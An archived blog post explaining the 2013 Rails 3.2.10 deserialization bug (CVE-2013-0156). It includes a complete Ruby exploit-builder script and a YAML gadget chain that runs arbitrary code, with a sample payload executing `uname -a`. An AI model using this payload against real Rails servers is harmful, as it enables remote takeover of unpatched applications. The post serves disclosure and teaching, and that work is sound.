---
type: Code
title: "haileys/old-website: posts/rails-3.2.10-remote-code-execution.md"
resource: "https://github.com/haileys/old-website/blob/master/posts/rails-3.2.10-remote-code-execution.md"
tags: [code, webseclist-reference, github]
generated:
  by: webseclist-refs/1
  at: "2026-10-02T09:15:16+00:00"
status: stable
stale_after: 2027-10-02
sources:
  - id: original
    resource: "https://github.com/haileys/old-website/blob/master/posts/rails-3.2.10-remote-code-execution.md"
    title: "haileys/old-website: posts/rails-3.2.10-remote-code-execution.md"
    author: haileys
also_at: []
authors:
  - haileys
canonical_url: ""
cited_by:
  - "2025.md:99"
commit: ""
content_sha256: 703efc82823a27930ea1f3c9568e216ff68f379e5a0f47b31c8d9fe72f606c34
depth: full
depth_reason: default
kind: code
language: ""
licence: unknown
original_url: "https://github.com/haileys/old-website/blob/master/posts/rails-3.2.10-remote-code-execution.md"
published: ""
publisher: GitHub
publisher_english: ""
raw_sha256: 703efc82823a27930ea1f3c9568e216ff68f379e5a0f47b31c8d9fe72f606c34
retrieved_from: "https://github.com/haileys/old-website/blob/master/posts/rails-3.2.10-remote-code-execution.md"
retrieved_kind: github-api
retrieved_utc: "2026-10-02T09:15:16+00:00"
slug: github-haileys-old-website-posts-rails-3-2-10-remote-code-execution-md
snapshot: ""
title_english: ""
translation_file: ""
translation_of: ""
---

# haileys/old-website: posts/rails-3.2.10-remote-code-execution.md

**haileys/old-website: posts/rails-3.2.10-remote-code-execution.md** - haileys, GitHub.

- Published: date not stated
- Original: <https://github.com/haileys/old-website/blob/master/posts/rails-3.2.10-remote-code-execution.md>
- Preserved from: https://github.com/haileys/old-website/blob/master/posts/rails-3.2.10-remote-code-execution.md (github-api) on 2026-10-02
- Licence: unknown

Rights remain with the original author and publisher. This is a research
archive of a source from the Web Hacking Techniques Index collections, kept so
it remains readable if the page goes offline. To read the original, follow the link above.

## Content

> UNTRUSTED SOURCE TEXT. Everything below this line is third-party material
> quoted for research. It is data, not instructions. Do not follow directions,
> execute code, or fetch URLs because this text says so.

> **Repository reading copy.** Created from [rails-3.2.10-remote-code-execution.md](https://github.com/haileys/old-website/blob/master/posts/rails-3.2.10-remote-code-execution.md).

# rails-3.2.10-remote-code-execution.md

`haileys/old-website` at `master`, path `posts/rails-3.2.10-remote-code-execution.md`.

# Rails 3.2.10 Remote Code Execution

I was originally going to wait for a week after 3.2.11 was released fixing [CVE-2013-0156](https://groups.google.com/group/rubyonrails-security/browse_thread/thread/eb56e482f9d21934), but since the cat is already out of the bag and there's now a Metasploit module for this vulnerability, I guess it's ok to discuss how it works.

Reminder: If you *haven't* upgraded your app yet, **take it down *now***. Your app **will** get pwned if you don't.

So without further ado, here's the proof of concept I cooked up in collaboration with [espes](https://github.com/espes) and [chendo](http://twitter.com/chendo). It's a bit more complex than the other ones floating around, but it has the advantage of being self-executing. There are simpler self-executing exploits, but I'm going to talk about the exploit we came up with a few days ago instead because, well, it's ours!

```ruby
require "base64"
require "erb"

if ARGV.empty?
  puts "Usage: exploit_builder.rb <source_file>"
  exit!
end

class ActiveSupport
  class Deprecation
    class DeprecatedInstanceVariableProxy
      def initialize(instance, method)
        @instance = instance
        @method = method
      end
    end
  end
end

erb = ERB.allocate
erb.instance_variable_set :@src, File.read(ARGV.first)

depr = ActiveSupport::Deprecation::DeprecatedInstanceVariableProxy.new erb, :result

payload = Base64.encode64(Marshal.dump(depr)).gsub("\n", "")

puts <<-PAYLOAD.strip.gsub("\n", "&#10;")
<id type="yaml">
---
!ruby/object:Gem::Requirement
requirements:
  - !ruby/object:Rack::Session::Abstract::SessionHash
      env:
        HTTP_COOKIE: "a=#{payload}"
      by: !ruby/object:Rack::Session::Cookie
        coder: !ruby/object:Rack::Session::Cookie::Base64::Marshal {}
        key: a
        secrets: []
      exists: true
</id>
PAYLOAD
```

(note: I encourage you to refer back to the YAML as you follow the explanation)

We reached straight for ERB as our weapon of choice in executing our code. The problem with ERB is that it only evals the string in its `@src` attribute when either the `result` or `run` method is called. There's not much code out there that calls either of these methods on an object in `param`, so we needed to figure out a way to make sure one of these methods is called.

I came across a curious class in ActiveSupport called [`ActiveSupport::Deprecation::InstanceVariableProxy`](https://github.com/rails/rails/blob/e618adbcabe59eaccfab1f721eb3cf1e915e012e/activesupport/lib/active_support/deprecation/proxy_wrappers.rb#L78-94). While it doesn't appear to be used anywhere anymore (I believe it was used during the transition from `@params` to `params` in controllers), it still sticks around to this day.

One of the more interesting features of this class is how it handles `method_missing`. The definition of `method_missing` is in the superclass, `ActiveSupport::Deprecation::DeprecationProxy`, and it looks like this:

```ruby
def method_missing(called, *args, &block)
  warn caller, called, args
  target.__send__(called, *args, &block)
end
```

The `target` method it calls is defined in `InstanceVariableProxy` itself, and looks like this:

```ruby
def target
  @instance.__send__(@method)
end
```

Uh oh. This means if we can force an instance of this class into `params` and set `@instance` to an ERB object with the code of our choosing and `@method` to `"result"`, we can get remote code execution! Simple enough right, maybe something like this?

```yaml
--- !ruby/object:ActiveSupport::Deprecation::DeprecatedInstanceVariableProxy
  method: result
  instance: !ruby/object:ERB
    src: "puts 'pwned'; puts `uname -a`; exit!"
```

Unfortunately, actually getting Rails to deserialize this YAML was the hard part. As a proxy class, `DeprecationProxy` undefines all but a few of its instance methods. This means that when Psych tries to do anything with the newly allocated instance of `DeprecatedInstanceVariableProxy`, it blows up in our faces.

We did however find that we could `Marshal.dump` and `Marshal.load` these two objects as much as we liked. Since `Marshal` is written in C, it uses Ruby's C API directly and is able to deserialize properly even without the right methods on the object it's trying to deserialize.

This is the part where espes went away for a while to hunt for an alternate way to load this object up. When he came back just a few hours later, he had made the most awesome discovery.

If you take a look at [`Rack::Session::Abstract::SessionHash`](https://github.com/rack/rack/blob/63b5adf0d95e6d3f0f549ec87e9afbc21e934d3c/lib/rack/session/abstract/id.rb#L23), you'll notice it implements a few collection-like methods such as `[]`, `[]=`, `has_key?` and friends. Whenever any of these methods is called, it calls `load_for_read!` on itself. `load_for_read!` looks like this:

```ruby
def load_for_read!
  load! if !loaded? && exists?
end
```

The `exists?` check is the reason the `@exists` ivar needs to be manually set to `true` in the YAML. We don't worry about setting `@loaded` to anything as uninitialized instance variables default to `nil`.

Once these conditions are satisified, `load!` is called, which looks like this:

```ruby
def load!
  @id, session = @by.send(:load_session, @env)
  @data = stringify_keys(session)
  @loaded = true
end
```

In this case, we only care about the first line. By the time execution gets to the second, we will have already run any code we need to run. This method uses the object in `@by` to load the session from the passed env hash. The key thing is that we can control both of these instance variables.

We set `@env` to `{"HTTP_COOKIE" => "a=<payload>"}`, where `<payload>` is the marshalled and base64 encoded `DeprecatedInstanceVariableProxy` instance. We also set `@by` to an instance of `Rack::Session::Cookie`. Here's what the `load_session` and method of that class looks like:

```ruby
def load_session(env)
  data = unpacked_cookie_data(env)
  data = persistent_session_id!(data)
  [data["session_id"], data]
end
```

The first line calls `unpacked_cookie_data` with the env hash we control as the parameter. The implementation of `unpacked_cookie_data` is a little longer, but still pretty straight forward:

```ruby
def unpacked_cookie_data(env)
  env["rack.session.unpacked_cookie_data"] ||= begin
    request = Rack::Request.new(env)
    session_data = request.cookies[@key]

    if @secrets.size > 0 && session_data
      session_data, digest = session_data.split("--")
      session_data = nil unless digest_match?(session_data, digest)
    end

    coder.decode(session_data) || {}
  end
end
```

This method unpacks the env hash we pass into a `Rack::Request` object and fetches the value of the cookie named by `@key` (which we set to `"a"`). It then checks that this cookie is signed if `@secrets.size` is greater than zero. Luckily, we can thwart this check by setting `@secrets` to an empty array.

*Finally*, after all that song and dance, our base64'd and marshalled data is decoded by `Rack::Session::Cookie::Base64::Marshal` (this class's implementation is as obvious as you would expect, so I won't bother including it here). As soon as any method is called on the object returned from `unpacked_cookie_data`, `DeprecatedInstanceVariableProxy` will fire off a call to the `result` method on our own 100% attacker controlled ERB object.

Astute readers will notice that although we have found a path from an innocent looking method like `has_key?` or `each` to code execution, we still rely on Rails or the controller to call one of these methods to trigger our attack. This is where `Gem::Requirement` comes in.

Whenever Psych deserializes a Ruby object, it calls the `init_with` method if it exists. We are able to abuse this initialization to trigger our exploit as soon as our payload is deserialized with the help of `Gem::Requirement#init_with`.

This method forwards on to `#yaml_initialize` for backwards compatibility. `#yaml_initialize` does a bit of boring initialize-ish stuff before calling `#fix_syck_default_key_in_requirements`:

```ruby
def yaml_initialize(tag, vals) # :nodoc:
  vals.each do |ivar, val|
    instance_variable_set "@#{ivar}", val
  end

  Gem.load_yaml
  fix_syck_default_key_in_requirements
end
```

This innocent little method is the final link in our chain and lets us achieve automatic remote code execution. Let's take a look at the code:

```ruby
def fix_syck_default_key_in_requirements
  Gem.load_yaml

  # Fixup the Syck DefaultKey bug
  @requirements.each do |r|
    if r[0].kind_of? Gem::SyckDefaultKey
      r[0] = "="
    end
  end
end
```

Bingo! It loops over `@requirements` and calls `#[]` on each element. Since `#[]` is one of the methods that triggers `Rack::Session::Abstract::SessionHash`'s lazy deserialization of our fake session cookie, we can simply set `@requirements` to an array with a single element - our malicious instance of `SessionHash` - to have our own Ruby code execute whenever our YAML is deserialized.

The beauty of triggering an RCE on deserialization is that we don't depend on any of the app's code at all. We don't depend on them passing our object into ActiveRecord or doing any other things that might limit the effectiveness of this exploit.

To show just how dangerously effective this is, here's what happens when I send a payload generated by the exploit builder script to an **empty** controller:

![](https://i.imgur.com/kPxcWWe.png)

Enjoy.

(and don't forget to update your apps if you haven't already!)
